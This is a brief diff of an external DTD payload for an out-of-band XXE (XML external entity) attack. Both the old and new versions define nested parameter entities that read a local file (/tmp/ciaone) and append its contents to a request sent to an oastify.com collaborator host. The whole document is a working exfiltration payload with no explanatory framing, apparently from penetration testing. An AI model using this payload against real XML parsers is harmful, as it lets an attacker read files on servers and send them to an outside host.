@@ -1,3 +1,3 @@
-<!ENTITY % file SYSTEM "file:///tmp/ciaone">
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://aycxbyx5e6n2k8zsquk8y9onwe25qwgk5.oastify.com/?%file;'>">
+<!ENTITY % aaa "<!ENTITY % file SYSTEM 'file:///tmp/ciaone'>">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://aycxbyx5e6n2k8zsquk8y9onwe25qwgk5.oastify.com/?%aaa;'>">
 %all;
